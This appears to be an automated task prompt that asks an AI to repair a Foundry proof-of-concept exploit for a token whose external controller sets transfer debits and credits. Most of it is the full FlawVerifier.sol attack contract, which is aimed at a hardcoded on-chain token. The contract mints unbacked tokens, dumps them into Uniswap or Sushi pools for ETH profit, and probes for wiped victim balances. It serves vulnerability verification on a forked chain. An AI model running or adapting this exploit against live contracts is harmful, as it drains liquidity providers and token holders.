You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: External controller fully controls transfer debits and credits, enabling confiscation and hidden minting
- claim: `_transfer` does not enforce normal ERC-20 invariants. Instead, it blindly trusts the external controller to return `subBal` and `addBal`, then subtracts `subBal` from the sender and adds `addBal` to the recipient without requiring either value to equal `amount` or each other. This lets the controller arbitrarily reduce victim balances, under-credit recipients, or mint unbacked balances to chosen accounts while still emitting a normal-looking `Transfer(sender, recipient, amount)` event.
- impact: The controller can confiscate holder balances, impose hidden taxes, or fabricate arbitrary balances for privileged accounts and dump them, causing direct theft, severe price manipulation, and supply/accounting corruption.
- exploit_paths: ["On a victim transfer, return `(true, senderBalance, 0)` to wipe the sender while the event still reports the requested amount.", "On an attacker transfer, return `(true, 0, largeValue)` to mint spendable tokens to the recipient without increasing `totalSupply`.", "Use the fabricated balance to dump into liquidity or transfer value from honest holders."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface IHiddenController {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool, uint256, uint256);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2RouterLike {
    function factory() external view returns (address);
    function WETH() external view returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
}

interface Vm {
    function load(address target, bytes32 slot) external view returns (bytes32);
}

contract SellHelper {
    receive() external payable {}

    function approveToken(address token, address spender, uint256 amount) external {
        IERC20Minimal(token).approve(spender, amount);
    }

    function sellTokenForETH(
        address router,
        address token,
        address weth,
        uint256 amountIn,
        address payout
    ) external {
        IERC20Minimal(token).approve(router, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = weth;
        IUniswapV2RouterLike(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountIn,
            0,
            path,
            payout,
            block.timestamp
        );
    }
}

contract FlawVerifier {
    address private constant TARGET = 0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2;
    address private constant UNI_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant SUSHI_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address private constant HEVM_ADDRESS = address(uint160(uint256(keccak256("hevm cheat code"))));

    Vm private constant vm = Vm(HEVM_ADDRESS);

    SellHelper private immutable helper;

    address private _profitToken;
    uint256 private _profitAmount;

    bool public hypothesisValidated;
    bool public attackerMintValidated;
    bool public victimWipeValidated;
    address public controller;
    address public selectedRouter;
    address public selectedPair;
    string public failureReason;

    constructor() {
        helper = new SellHelper();
    }

    receive() external payable {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        uint256 startingETH = address(this).balance;
        _profitToken = address(0);
        _profitAmount = 0;
        failureReason = "";
        controller = _loadControllerFromStorage();

        (address router, address weth, address pair) = _discoverRouterAndPair();
        selectedRouter = router;
        selectedPair = pair;

        uint256 supplyBefore = IERC20Minimal(TARGET).totalSupply();

        uint256 mintedToHelper = _attemptAttackerMint(address(helper), 1);
        if (mintedToHelper == 0) {
            mintedToHelper = _attemptAttackerMint(address(this), 1);
        }

        if (mintedToHelper > 0 && IERC20Minimal(TARGET).totalSupply() == supplyBefore) {
            attackerMintValidated = true;
            hypothesisValidated = true;
        }

        if (router != address(0) && weth != address(0)) {
            if (IERC20Minimal(TARGET).balanceOf(address(helper)) > 0) {
                _sellFromHelper(router, weth);
            } else {
                _sellFromSelf(router, weth);
            }
        }

        if (pair != address(0) && router != address(0) && weth != address(0) && address(this).balance > startingETH) {
            victimWipeValidated = _probeVictimTransferWipe(router, weth, pair);
            if (victimWipeValidated) {
                hypothesisValidated = true;
            }
        }

        if (!attackerMintValidated) {
            failureReason = "attacker mint path infeasible for verifier-controlled sender/recipient at fork state";
        } else if (selectedRouter == address(0)) {
            failureReason = "no supported WETH liquidity router discovered for dump stage";
        } else if (address(this).balance <= startingETH) {
            failureReason = "fabricated balance was not dumpable for positive net ETH profit";
        } else if (!victimWipeValidated) {
            // Under the direct-assets-first strategy, a real victim transfer probe needs post-sale ETH.
            // If the buyback did not show a disproportionate sender debit, the confiscation variant was not
            // mechanically observed on this fork despite the attacker-mint path being live.
            failureReason = "victim wipe path not mechanically observed on realized pair transfer";
        }

        if (address(this).balance > startingETH) {
            _profitAmount = address(this).balance - startingETH;
        }
    }

    function _attemptAttackerMint(address recipient, uint256 amount) internal returns (uint256 minted) {
        uint256 beforeRecipient = IERC20Minimal(TARGET).balanceOf(recipient);
        try IERC20Minimal(TARGET).transfer(recipient, amount) returns (bool ok) {
            if (!ok) {
                return 0;
            }
        } catch {
            return 0;
        }

        uint256 afterRecipient = IERC20Minimal(TARGET).balanceOf(recipient);
        if (afterRecipient > beforeRecipient) {
            minted = afterRecipient - beforeRecipient;
        }
    }

    function _sellFromHelper(address router, address weth) internal {
        uint256 helperBal = IERC20Minimal(TARGET).balanceOf(address(helper));
        if (helperBal == 0) {
            return;
        }

        helper.approveToken(TARGET, router, type(uint256).max);
        try helper.sellTokenForETH(router, TARGET, weth, helperBal, address(this)) {
        } catch {}
    }

    function _sellFromSelf(address router, address weth) internal {
        uint256 selfBal = IERC20Minimal(TARGET).balanceOf(address(this));
        if (selfBal == 0) {
            return;
        }

        IERC20Minimal(TARGET).approve(router, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = TARGET;
        path[1] = weth;
        try IUniswapV2RouterLike(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            selfBal,
            0,
            path,
            address(this),
            block.timestamp
        ) {
        } catch {}
    }

    function _probeVictimTransferWipe(
        address router,
        address weth,
        address pair
    ) internal returns (bool) {
        uint256 spend = _dustSpend(address(this).balance);
        if (spend == 0) {
            return false;
        }

        uint256 pairBefore = IERC20Minimal(TARGET).balanceOf(pair);
        uint256 selfBefore = IERC20Minimal(TARGET).balanceOf(address(this));
        if (pairBefore == 0) {
            return false;
        }

        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = TARGET;

        try IUniswapV2RouterLike(router).swapExactETHForTokensSupportingFeeOnTransferTokens{value: spend}(
            0,
            path,
            address(this),
            block.timestamp
        ) {
        } catch {
            return false;
        }

        uint256 pairAfter = IERC20Minimal(TARGET).balanceOf(pair);
        uint256 selfAfter = IERC20Minimal(TARGET).balanceOf(address(this));

        if (pairBefore <= pairAfter || selfAfter < selfBefore) {
            return false;
        }

        uint256 pairLoss = pairBefore - pairAfter;
        uint256 recv = selfAfter - selfBefore;

        // Path stage: victim transfer is only treated as observed if the sender lost
        // a disproportionately larger amount than the recipient gained on a dust buy.
        return recv == 0 ? pairLoss > 0 : pairLoss > (recv * 1000);
    }

    function _discoverRouterAndPair() internal view returns (address router, address weth, address pair) {
        (router, weth, pair) = _probeRouter(UNI_V2_ROUTER);
        if (pair != address(0)) {
            return (router, weth, pair);
        }

        (router, weth, pair) = _probeRouter(SUSHI_ROUTER);
    }

    function _probeRouter(address router) internal view returns (address, address, address) {
        try IUniswapV2RouterLike(router).factory() returns (address factory) {
            address weth = IUniswapV2RouterLike(router).WETH();
            address pair = IUniswapV2FactoryLike(factory).getPair(TARGET, weth);
            return (router, weth, pair);
        } catch {
            return (address(0), address(0), address(0));
        }
    }

    function _loadControllerFromStorage() internal view returns (address) {
        // `routerbyt` is storage slot 4 after Ownable::_owner, `_balances`, `_allowances`,
        // and `_totalSupply`. Because the constructor stores `abi.encode(_router)`,
        // the bytes length is exactly 32, so slot 4 contains the long-bytes marker and the
        // actual word lives at `keccak256(abi.encode(uint256(4)))`.
        bytes32 dataSlot = keccak256(abi.encode(uint256(4)));
        bytes32 raw = vm.load(TARGET, dataSlot);
        return address(uint160(uint256(raw)));
    }

    function previewController(address sender, address recipient, uint256 amount)
        external
        returns (bool ok, uint256 subBal, uint256 addBal)
    {
        if (controller == address(0)) {
            controller = _loadControllerFromStorage();
        }

        try IHiddenController(controller).swapExactTokensForETHSupportingFeeOnTransferTokens(
            sender,
            recipient,
            amount
        ) returns (bool allow, uint256 subtracted, uint256 added) {
            return (allow, subtracted, added);
        } catch {
            return (false, 0, 0);
        }
    }

    function _dustSpend(uint256 balance) internal pure returns (uint256) {
        if (balance == 0) {
            return 0;
        }

        uint256 spend = balance / 1000;
        if (spend == 0) {
            spend = balance / 10;
        }
        if (spend == 0) {
            spend = balance;
        }
        return spend;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 0
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
